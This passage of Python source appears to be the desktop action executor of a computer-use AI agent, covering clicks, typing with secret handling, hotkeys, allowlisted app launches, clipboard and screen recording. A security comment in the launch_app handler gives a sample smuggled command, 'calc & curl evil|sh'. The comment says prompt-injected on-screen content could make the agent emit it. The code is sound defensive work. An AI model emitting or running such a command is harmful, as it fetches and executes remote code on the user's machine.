    ) -> tuple[ExecutedAction | None, float | None]:
        """Bounds + visual-servo gate shared by all click variants.

        Returns (failure_action, variance) — failure_action is non-None when the
        caller should return early. Visual Servo is a system invariant: every
        click goes through this gate.
        """
        if action.x is None or action.y is None:
            return (
                self._fail(action, f"{kind} requires x,y coordinates on desktop", FailureCategory.EXECUTION_TARGET_NOT_FOUND),
                None,
            )
        in_bounds, monitors = self._coord_in_monitor_bounds(action.x, action.y)
        if not in_bounds:
            logger.warning(
                "%s skipped: coord (%d, %d) is outside all monitor bounds [monitors=%s]",
                kind, action.x, action.y, monitors,
            )
            return (
                self._fail(
                    action,
                    f"{kind} skipped: coord ({action.x}, {action.y}) is outside all monitor bounds",
                    FailureCategory.EXECUTION_ERROR,
                ),
                None,
            )
        variance: float | None = None
        try:
            has_content, variance = await asyncio.to_thread(
                self._region_has_content, action.x, action.y,
                50, None, action.is_input_zone,
            )
        except Exception as _servo_exc:
            logger.debug("Visual servo check skipped (mss error): %s", _servo_exc)
            has_content = True
        if not has_content:
            logger.warning(
                "CoordDriftWarning: uniform region at (%d, %d) — target likely shifted or element absent",
                action.x, action.y,
            )
            return (
                self._fail(
                    action,
                    f"visual servo: blank region at ({action.x}, {action.y}); target may have shifted",
                    FailureCategory.EXECUTION_TARGET_NOT_FOUND,
                ).model_copy(update={"visual_variance": variance}),
                variance,
            )
        return (None, variance)

    async def _exec_click(self, action: AgentAction) -> ExecutedAction:
        gate, variance = await self._click_preamble(action, "click")
        if gate is not None:
            return gate
        try:
            await asyncio.to_thread(pyautogui.click, action.x, action.y)
            await self.settle_now(self._post_action_delay)
            after_path = await self._capture_after()
            return self._ok(action, f"Clicked at ({action.x}, {action.y})", after_path).model_copy(update={"visual_variance": variance})
        except Exception as exc:
            return self._fail(action, f"Click failed: {exc}", FailureCategory.EXECUTION_ERROR)

    async def _exec_double_click(self, action: AgentAction) -> ExecutedAction:
        gate, variance = await self._click_preamble(action, "double_click")
        if gate is not None:
            return gate
        try:
            await asyncio.to_thread(pyautogui.doubleClick, action.x, action.y)
            await self.settle_now(self._post_action_delay)
            after_path = await self._capture_after()
            return self._ok(action, f"Double-clicked at ({action.x}, {action.y})", after_path).model_copy(update={"visual_variance": variance})
        except Exception as exc:
            return self._fail(action, f"Double-click failed: {exc}", FailureCategory.EXECUTION_ERROR)

    async def _exec_triple_click(self, action: AgentAction) -> ExecutedAction:
        gate, variance = await self._click_preamble(action, "triple_click")
        if gate is not None:
            return gate
        try:
            await asyncio.to_thread(pyautogui.click, action.x, action.y, clicks=3, interval=0.05)
            await self.settle_now(self._post_action_delay)
            after_path = await self._capture_after()
            return self._ok(action, f"Triple-clicked at ({action.x}, {action.y})", after_path).model_copy(update={"visual_variance": variance})
        except Exception as exc:
            return self._fail(action, f"Triple-click failed: {exc}", FailureCategory.EXECUTION_ERROR)

    async def _exec_right_click(self, action: AgentAction) -> ExecutedAction:
        gate, variance = await self._click_preamble(action, "right_click")
        if gate is not None:
            return gate
        try:
            await asyncio.to_thread(pyautogui.rightClick, action.x, action.y)
            await self.settle_now(self._post_action_delay)
            after_path = await self._capture_after()
            return self._ok(action, f"Right-clicked at ({action.x}, {action.y})", after_path).model_copy(update={"visual_variance": variance})
        except Exception as exc:
            return self._fail(action, f"Right-click failed: {exc}", FailureCategory.EXECUTION_ERROR)

    @staticmethod
    def _region_mean(raw: bytes) -> float:
        if not raw:
            return 0.0
        return sum(raw) / len(raw)

    async def _exec_type(self, action: AgentAction) -> ExecutedAction:
        if action.text is None:
            return self._fail(action, "type requires text", FailureCategory.EXECUTION_ERROR)
        # KAN-103: a {{secret:NAME}} placeholder is swapped for its value here, in a local
        # variable, so the action (and everything that records it) keeps the placeholder.
        try:
            text, secret_values = resolve_for_type(action.text)
        except SecretError as exc:
            return self._fail(action, f"type failed: {exc}", FailureCategory.EXECUTION_ERROR)
        if secret_values and (problem := self._secret_problem(text)):
            return self._fail(action, f"type failed: {problem}", FailureCategory.EXECUTION_ERROR)
        if action.x is not None and action.y is not None:
            # The focus click gets the clicks' bounds gate, so text never goes to a
            # point off every monitor. Not the blank-region servo: a TYPE target is an
            # input zone by nature, and an empty field or document looks uniform.
            in_bounds, monitors = self._coord_in_monitor_bounds(action.x, action.y)
            if not in_bounds:
                logger.warning(
                    "type skipped: coord (%d, %d) is outside all monitor bounds [monitors=%s]",
                    action.x, action.y, monitors,
                )
                return self._fail(
                    action,
                    f"type skipped: coord ({action.x}, {action.y}) is outside all monitor bounds",
                    FailureCategory.EXECUTION_ERROR,
                )
        try:
            if action.x is not None and action.y is not None:
                # Atomic focus+type: click then verify focus by mean-pixel delta.
                # Cursor blink and antialiasing make raw byte equality unreliable
                # (bytes always differ); compare region means with a tolerance.
                pre_pixels = await asyncio.to_thread(self._sample_region, action.x, action.y)
                await asyncio.to_thread(pyautogui.click, action.x, action.y)
                await asyncio.sleep(0.15)
                post_pixels = await asyncio.to_thread(self._sample_region, action.x, action.y)
                pre_mean = self._region_mean(pre_pixels)
                post_mean = self._region_mean(post_pixels)
                # Threshold: 1.5 mean intensity units (out of 255). Cursor blink
                # alone moves the mean by ~3-5; a focus-stealing transition is
                # much larger. Below 1.5 means nothing meaningful changed.
                if abs(post_mean - pre_mean) < 1.5:
                    logger.debug(
                        "Focus verification: no visual change at (%d, %d) (mean delta=%.2f), retrying click",
                        action.x, action.y, abs(post_mean - pre_mean),
                    )
                    await asyncio.to_thread(pyautogui.click, action.x, action.y)
                    await asyncio.sleep(0.25)
            if action.clear_before_typing:
                await asyncio.to_thread(pyautogui.hotkey, 'ctrl', 'a')
                await asyncio.sleep(0.05)
            if secret_values:
                # A secret never touches the clipboard (history, cloud sync, READ_CLIPBOARD).
                self._secrets_used.setdefault(self._current_run_id or "", set()).update(secret_values)
                await self._enter_secret(text)
            else:
                await self._enter_text(text)
            if action.press_enter:
                await asyncio.sleep(0.05)
                await asyncio.to_thread(pyautogui.press, 'enter')
            await self.settle_now(self._post_action_delay)
            after_path = await self._capture_after()
            return self._ok(action, f"Typed '{action.text}'", after_path)
        except Exception as exc:
            return self._fail(action, redact(f"Type failed: {exc}", secret_values), FailureCategory.EXECUTION_ERROR)

    def _secret_problem(self, text: str) -> str | None:
        """Why ``text`` cannot be typed as a secret here (checked before any click), else None."""
        if sys.platform != "win32":
            return "this desktop cannot type a secret without the clipboard"
        return None

    async def _enter_secret(self, text: str) -> None:
        """Type a secret as key events, never through the clipboard (Windows: SendInput with
        KEYEVENTF_UNICODE, so surrogate pairs and accents work)."""
        if sys.platform != "win32":
            raise SecretError("this desktop cannot type a secret without the clipboard")
        await asyncio.to_thread(sendinput.type_unicode, text)

    async def _enter_text(self, text: str) -> None:
        """Put ``text`` into the focused field. Clipboard-paste avoids character-ordering
        issues with pyautogui.write() when typing long strings or strings containing
        special characters like $."""
        await asyncio.to_thread(pyperclip.copy, text)
        await asyncio.to_thread(pyautogui.hotkey, 'ctrl', 'v')

    def _sample_region(self, x: int, y: int, radius: int = 30) -> bytes:
        """Capture a small pixel region around (x, y) for focus-change detection."""
        with _mss() as sct:
            return bytes(sct.grab(_sample_box(sct.monitors[0], x, y, radius)).rgb)

    async def _exec_press_key(self, action: AgentAction) -> ExecutedAction:
        if action.key is None:
            return self._fail(action, "press_key requires key", FailureCategory.EXECUTION_ERROR)
        key = _normalize_key_pyautogui(action.key)
        if _unknown_keys([key]):
            return self._fail(action, f"Unknown key name '{action.key}'; nothing was pressed", FailureCategory.EXECUTION_ERROR)
        try:
            await asyncio.to_thread(pyautogui.press, key)
            await self.settle_now(self._post_action_delay)
            after_path = await self._capture_after()
            return self._ok(action, f"Pressed key '{key}'", after_path)
        except Exception as exc:
            return self._fail(action, f"Press key failed: {exc}", FailureCategory.EXECUTION_ERROR)

    async def _exec_hotkey(self, action: AgentAction) -> ExecutedAction:
        if action.key is None:
            return self._fail(action, "hotkey requires key", FailureCategory.EXECUTION_ERROR)
        normalised = action.key.lower().replace(" ", "")
        # Block alt+f4 — it can close VS Code, the browser, or any focused app
        if normalised in ("alt+f4", "alt+fn+f4"):
            return self._fail(
                action,
                "alt+f4 is blocked for safety — use the stop action instead of closing windows",
                FailureCategory.EXECUTION_ERROR,
            )
        keys = [_normalize_key_pyautogui(k.strip()) for k in action.key.split("+")]
        unknown = _unknown_keys(keys)
        if unknown:
            return self._fail(
                action, f"Unknown key name(s) {', '.join(unknown)} in '{action.key}'; nothing was pressed", FailureCategory.EXECUTION_ERROR
            )
        try:
            await asyncio.to_thread(pyautogui.hotkey, *keys)
            await self.settle_now(self._post_action_delay)
            after_path = await self._capture_after()
            return self._ok(action, f"Pressed hotkey '{action.key}'", after_path)
        except Exception as exc:
            return self._fail(action, f"Hotkey failed: {exc}", FailureCategory.EXECUTION_ERROR)

    async def _exec_launch_app(self, action: AgentAction) -> ExecutedAction:
        if action.text is None:
            return self._fail(action, "launch_app requires text (app name)", FailureCategory.EXECUTION_ERROR)
        app_key = action.text.strip().lower()
        # SECURITY: only launch apps from the trusted, developer-defined catalog.
        # The command string passed to the shell below MUST be a fixed catalog
        # constant — never untrusted model output. An LLM (or prompt-injected
        # on-screen content) could otherwise emit text like "calc & curl evil|sh"
        # and, under shell=True, achieve arbitrary command execution. Unknown
        # apps are denied rather than executed as raw text.
        command = APP_LAUNCH_TARGETS.get(app_key)
        if command is None:
            return self._fail(
                action,
                f"launch_app: '{action.text.strip()}' is not a recognized application; "
                "only catalog apps can be launched.",
                FailureCategory.EXECUTION_ERROR,
            )
        exe_name = Path(command.split()[0]).name.lower()
        if not exe_name.endswith(".exe"):
            exe_name += ".exe"
        # Whatever runs right before this launch is not ours.
        before = await asyncio.to_thread(_image_pids, exe_name) if self._current_run_id is not None else None
        try:
            if command.startswith("ms-"):
                await asyncio.to_thread(os.startfile, command)  # type: ignore[attr-defined]
            elif command in _CONSOLE_APPS:
                # Its own console, and no redirected handles: an interactive shell
                # handed the server's empty stdin reads EOF and closes at once.
                proc = await asyncio.to_thread(
                    subprocess.Popen, command, creationflags=_NEW_CONSOLE, env=_launch_env()
                )
            else:
                proc = await asyncio.to_thread(
                    subprocess.Popen,
                    # nosec B602: `command` is a hardcoded catalog constant (above),
                    # not user/model input, so shell=True carries no injection risk.
                    command,
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=_NO_CONSOLE,
                    env=_launch_env(),
                )
                # Track process for cleanup
                if self._current_run_id is not None:
                    self._launched_processes.setdefault(self._current_run_id, []).append(proc)
            # Also track the exe name for taskkill fallback (handles Chrome, etc.
            # where the launcher process exits but the app keeps running)
            if self._current_run_id is not None:
                self._launched_app_names.setdefault(self._current_run_id, []).append(exe_name)
            await self.settle_now(self._post_launch_delay)
            if self._current_run_id is not None and before is not None:
                after = await asyncio.to_thread(_image_pids, exe_name)
                if after is not None:
                    # Only the PIDs that appeared during this launch belong to the run.
                    owned = self._owned_pids.setdefault(self._current_run_id, {})
                    owned.setdefault(exe_name, set()).update(after - before)
            after_path = await self._capture_after()
            return self._ok(action, f"Launched '{command}'", after_path)
        except Exception as exc:
            return self._fail(action, f"Launch failed: {exc}", FailureCategory.EXECUTION_ERROR)

    async def _exec_drag(self, action: AgentAction) -> ExecutedAction:
        if action.x is None or action.y is None or action.x_end is None or action.y_end is None:
            return self._fail(action, "drag requires x, y, x_end, y_end", FailureCategory.EXECUTION_TARGET_NOT_FOUND)
        try:
            # Use explicit mouseDown/moveTo/mouseUp for reliable drags on Windows.
            # pyautogui.dragTo can fail when DPI scaling or focus issues occur.
            await asyncio.to_thread(pyautogui.moveTo, action.x, action.y)
            await asyncio.sleep(0.15)
            await asyncio.to_thread(pyautogui.mouseDown)
            await asyncio.sleep(0.1)
            await asyncio.to_thread(pyautogui.moveTo, action.x_end, action.y_end, duration=0.6)
            await asyncio.sleep(0.1)
            await asyncio.to_thread(pyautogui.mouseUp)
            await asyncio.sleep(0.3)
            after_path = await self._capture_after()
            return self._ok(
                action,
                f"Dragged from ({action.x}, {action.y}) to ({action.x_end}, {action.y_end})",
                after_path,
            )
        except Exception as exc:
            # Ensure mouse is released on failure
            try:
                await asyncio.to_thread(pyautogui.mouseUp)
            except Exception:
                pass
            return self._fail(action, f"Drag failed: {exc}", FailureCategory.EXECUTION_ERROR)

    async def _exec_scroll(self, action: AgentAction) -> ExecutedAction:
        if action.scroll_amount is None:
            return self._fail(action, "scroll requires scroll_amount", FailureCategory.EXECUTION_ERROR)
        if action.x is None or action.y is None:
            return self._fail(action, "scroll requires x, y coordinates", FailureCategory.EXECUTION_TARGET_NOT_FOUND)
        try:
            if action.horizontal:
                await asyncio.to_thread(_hscroll, action.scroll_amount, action.x, action.y)
                direction = "right" if action.scroll_amount > 0 else "left"
            else:
                await asyncio.to_thread(pyautogui.scroll, action.scroll_amount, x=action.x, y=action.y)
                direction = "up" if action.scroll_amount > 0 else "down"
            await self.settle_now(self._post_action_delay)
            after_path = await self._capture_after()
            return self._ok(
                action,
                f"Scrolled {direction} by {abs(action.scroll_amount)} at ({action.x}, {action.y})",
                after_path,
            )
        except Exception as exc:
            return self._fail(action, f"Scroll failed: {exc}", FailureCategory.EXECUTION_ERROR)

    async def _exec_hover(self, action: AgentAction) -> ExecutedAction:
        if action.x is None or action.y is None:
            return self._fail(action, "hover requires x, y coordinates", FailureCategory.EXECUTION_TARGET_NOT_FOUND)
        try:
            await asyncio.to_thread(pyautogui.moveTo, action.x, action.y)
            await asyncio.sleep(0.15)
            after_path = await self._capture_after()
            return self._ok(action, f"Hovered at ({action.x}, {action.y})", after_path)
        except Exception as exc:
            return self._fail(action, f"Hover failed: {exc}", FailureCategory.EXECUTION_ERROR)

    async def _exec_read_clipboard(self, action: AgentAction) -> ExecutedAction:
        try:
            content = await asyncio.to_thread(pyperclip.paste)
            # Belt and braces: a secret typed in this run is never handed back to the model.
            content = redact(content, self._secrets_used.get(self._current_run_id or "", ()))
            return self._ok(action, f"Clipboard content: {content}", None)
        except Exception as exc:
            return self._fail(action, f"Read clipboard failed: {exc}", FailureCategory.EXECUTION_ERROR)

    async def _exec_write_clipboard(self, action: AgentAction) -> ExecutedAction:
        if action.text is None:
            return self._fail(action, "write_clipboard requires text", FailureCategory.EXECUTION_ERROR)
        try:
            await asyncio.to_thread(pyperclip.copy, action.text)
            return self._ok(action, f"Copied to clipboard: '{action.text}'", None)
        except Exception as exc:
            return self._fail(action, f"Write clipboard failed: {exc}", FailureCategory.EXECUTION_ERROR)

    async def _exec_screenshot_region(self, action: AgentAction) -> ExecutedAction:
        if action.x is None or action.y is None or action.x_end is None or action.y_end is None:
            return self._fail(action, "screenshot_region requires x, y, x_end, y_end", FailureCategory.EXECUTION_TARGET_NOT_FOUND)
        if action.x_end <= action.x or action.y_end <= action.y:
            return self._fail(action, "screenshot_region requires x_end > x and y_end > y", FailureCategory.EXECUTION_ERROR)
        try:
            region = {"top": action.y, "left": action.x, "width": action.x_end - action.x, "height": action.y_end - action.y}
            filename = f"region_{uuid4().hex[:8]}.png"
            filepath = self._artifact_dir / filename

            def _grab_region() -> None:
                with _mss() as sct:
                    shot = sct.grab(region)
                    mss.tools.to_png(shot.rgb, shot.size, output=str(filepath))

            await asyncio.to_thread(_grab_region)
            return self._ok(
                action,
                f"Captured region ({action.x},{action.y})-({action.x_end},{action.y_end})",
                str(filepath),
            )
        except Exception as exc:
            return self._fail(action, f"Screenshot region failed: {exc}", FailureCategory.EXECUTION_ERROR)

    async def _exec_wait(self, action: AgentAction) -> ExecutedAction:
        wait_s = (action.wait_ms or 1000) / 1000.0
        await asyncio.sleep(wait_s)
        after_path = await self._capture_after()
        return self._ok(action, f"Waited {wait_s:.1f}s", after_path)

    async def _execute_batch(self, action: AgentAction) -> ExecutedAction:
        """Run a computer use turn's actions in order, stopping at the first failure."""
        if not action.actions:
            return self._fail(action, "batch requires actions", FailureCategory.EXECUTION_ERROR)
        completed: list[str] = []
        last_artifact_path: str | None = None
        for index, child_action in enumerate(action.actions):
            blocked = None
            if index > 0 and self.batch_child_check is not None:
                blocked = await self.batch_child_check(child_action)
            if blocked is not None:
                return ExecutedAction(
                    action=action,
                    success=False,
                    detail=f"Batch stopped before {child_action.action_type.value}: {blocked}",
                    artifact_path=last_artifact_path,
                    failure_category=FailureCategory.EXECUTION_ERROR,
                    batch_failed_index=index,
                )
            result = await self.execute(child_action)
            completed.append(f"{child_action.action_type.value}:{'ok' if result.success else 'failed'}")
            if not result.success:
                return ExecutedAction(
                    action=action,
                    success=False,
                    detail=f"Batch failed on {child_action.action_type.value}: {result.detail}",
                    artifact_path=result.artifact_path,
                    execution_trace=result.execution_trace,
                    failure_category=result.failure_category,
                    failure_stage=result.failure_stage,
                    batch_failed_index=index,
                )
            last_artifact_path = result.artifact_path or last_artifact_path
        return self._ok(action, f"Executed batch: {', '.join(completed)}", last_artifact_path)

    async def _exec_noop(self, action: AgentAction) -> ExecutedAction:
        detail = "Acknowledged stop" if action.action_type is ActionType.STOP else f"Waiting for user: {action.text}"
        return self._ok(action, detail, None)

    async def _exec_unsupported(self, action: AgentAction) -> ExecutedAction:
        return self._fail(
            action,
            f"Action '{action.action_type}' is not supported on desktop",
            FailureCategory.EXECUTION_ERROR,
        )

    # ── helpers ──────────────────────────────────────────────────

    async def _capture_after(self) -> str:
        self._internal_capture = True
        try:
            frame = await self.capture()
        finally:
            self._internal_capture = False
        return frame.artifact_path

    def _ok(self, action: AgentAction, detail: str, after_path: str | None) -> ExecutedAction:
        trace = ExecutionTrace(
            attempts=[
                ExecutionAttemptTrace(
                    attempt_index=1,
                    revalidation_result="desktop_action_no_revalidation",
                    verification_result="success",
                )
            ],
            final_outcome="success",
        )
        return ExecutedAction(
            action=action,
            success=True,
            detail=detail,
            artifact_path=after_path,
            execution_trace=trace,
        )

    def _fail(
        self,
        action: AgentAction,
        detail: str,
        failure_category: FailureCategory,
    ) -> ExecutedAction:
        trace = ExecutionTrace(
            attempts=[
                ExecutionAttemptTrace(
                    attempt_index=1,
                    revalidation_result="desktop_action_no_revalidation",
                    verification_result="failure",
                    failure_category=failure_category,
                )
            ],
            final_outcome="failure",
            final_failure_category=failure_category,
        )
        return ExecutedAction(
            action=action,
            success=False,
            detail=detail,
            execution_trace=trace,
            failure_category=failure_category,
            failure_stage=LoopStage.EXECUTE,
        )

    async def start_run_recording(self, run_id: str, root_dir: str | Path = "runs") -> None:
        """Start a full-run screen recording for *run_id*.

        Uses streaming mode so frames are written directly to disk — no in-memory
        buffer regardless of run length.  The video is saved to
        ``runs/<run_id>/run_recording.mp4`` at 8 fps, half native resolution.
        Safe to call multiple times for the same run_id (no-op if already recording).
        """
        if run_id in self._run_recorders:
            return
        from operon.agent.artifacts.screen_recorder import ScreenRecorder

        video_path = Path(root_dir) / run_id / "run_recording.mp4"
        recorder = ScreenRecorder(
            output_path=video_path,
            fps=8,
            max_duration=1800.0,  # 30-min hard cap; stop() ends it sooner
            streaming=True,
        )
        self._run_recorders[run_id] = recorder
        self._run_video_paths[run_id] = video_path
        await recorder.start()
        logger.info("run_recording started: run=%s path=%s", run_id, video_path)

    async def stop_run_recording(self, run_id: str) -> Path | None:
        """Stop the full-run recording for *run_id* and return the video path."""
        recorder = self._run_recorders.pop(run_id, None)
        if recorder is None:
            return self._run_video_paths.get(run_id)
        final_path = await recorder.stop()
        if final_path:
            self._run_video_paths[run_id] = final_path
            logger.info("run_recording saved: run=%s path=%s", run_id, final_path)
        else:
            logger.warning("run_recording: no output produced for run=%s", run_id)
            self._run_video_paths.pop(run_id, None)
        return final_path

    def recorded_video_path_for_run(self, run_id: str) -> Path | None:
        """Return the saved full-run video path, or None if not recorded."""
        return self._run_video_paths.get(run_id)
